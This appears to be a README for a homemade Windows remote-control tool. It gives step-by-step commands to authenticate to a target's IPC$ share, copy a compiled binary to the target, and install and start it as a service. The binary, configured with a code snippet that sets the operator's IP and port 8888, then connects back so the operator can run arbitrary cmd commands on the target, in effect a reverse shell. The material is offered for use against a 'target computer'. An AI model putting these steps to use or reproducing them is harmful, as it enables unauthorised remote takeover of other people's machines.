# It's a simple tool to use IPC in LAN to remote conrtol
## How to use:
- First, we need to know our **IP** in our LAN. Useing the command **<code>ipconfig</code>** in our cmd.exe
- Then, edit the **IP** in the <code>
struct sockaddr_in serverAddr;
serverAddr.sin_family = AF_INET;
serverAddr.sin_addr.s_addr = inet_addr **("192.168.123.7")**; //Write your IP there
serverAddr.sin_port = htons(8888);</code>
- Third, use **<code>net use \\IP\ipc$ "password" /user:"target computer user"</code>** command in your cmd.exe to connect IPC to your target computer. [click here to learn more](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/gg651155(v=ws.11))
- Then, use **<code>dir \\IP\c$</code>** to make sure we hav sufficient permissions to make a Windwos Service in the target computer. If we can, change our code like second step in the **run.c**. Next, we need to use **<code>g++ -o run.exe run.c -lws2_32 -static</code>** command to make it as a .exe file.
- Next, use **<code>copy run.exe \\IP\\PATH</code>** tocopy it to yuor target computer. Then, use **<code>sc //IP create SERVICENAME binpath= "PATH"</code>** in our target. If it runs, run our **socket_server.c** and use **<code>sc \\IP start SERVICENAME</code>** to start Windows service in our target computer.
- Finally, if our **socket_c** shows *run* and can input something, input your cmd command which will run in your target computer.
